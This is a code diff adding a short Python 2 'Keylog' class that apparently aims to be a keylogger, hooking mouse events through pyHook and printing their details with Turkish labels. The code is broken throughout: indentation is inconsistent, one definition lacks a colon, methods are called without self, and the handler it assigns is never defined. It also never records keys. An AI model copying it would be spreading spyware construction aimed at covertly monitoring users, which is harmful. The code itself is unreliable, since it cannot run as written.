@@ -1,0 +1,32 @@
+import pythoncom 
+import pyHook
+
+
+class Keylog(object):
+     def __init__(self):
+        fare()
+	key()
+	bekl()
+
+     def fare(self, event):
+    	print 'mesaj ismi:', self.event.MessageName
+    	print 'mesaj:', self.event.Message
+    	print 'zaman:', self.event.Time
+    	print 'pencere:', self.event.Window
+    	print 'pencere ismi:', self.event.WindowName
+    	print 'pozisyon:', self.event.Position
+    	print 'disk:', self.event.Wheel
+    	print 'eklenen:', self.event.Injected
+    	print '---'
+
+
+    def key(self):
+       return True
+
+     def bekl(self)
+        self.hm = pyHook.HookManager()
+        self.hm.MouseAll = OnMouseEvent
+        self.hm.HookMouse()
+        self.pythoncom.PumpMessages()
+        
+keylogger = Keylog()
